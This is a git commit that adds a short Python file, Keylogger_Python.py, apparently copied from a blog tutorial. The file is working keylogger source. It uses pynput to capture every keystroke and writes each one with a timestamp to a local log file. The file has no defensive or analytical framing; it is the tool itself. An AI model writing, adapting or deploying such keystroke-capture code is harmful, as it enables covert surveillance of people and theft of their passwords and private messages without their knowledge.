a7abf570430acffe85ed675b5dbd3c6a61fec8b2
wem-r <57370095+wem-r@users.noreply.github.com>
2022-05-11 15:14:34 +0200

    Create Keylogger_Python.py

---
+++ Misc/Keylogger_Python.py
@@ -0,0 +1,12 @@
+#From : https://blog.octachart.com/keylogger-in-just-10-lines-of-python
+
+from pynput.keyboard import Key, Listener
+import logging
+
+logging.basicConfig(filename=("keylogger.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+
+def on_press(key):
+    logging.info(str(key))
+
+with Listener(on_press=on_press) as listener :
+    listener.join()
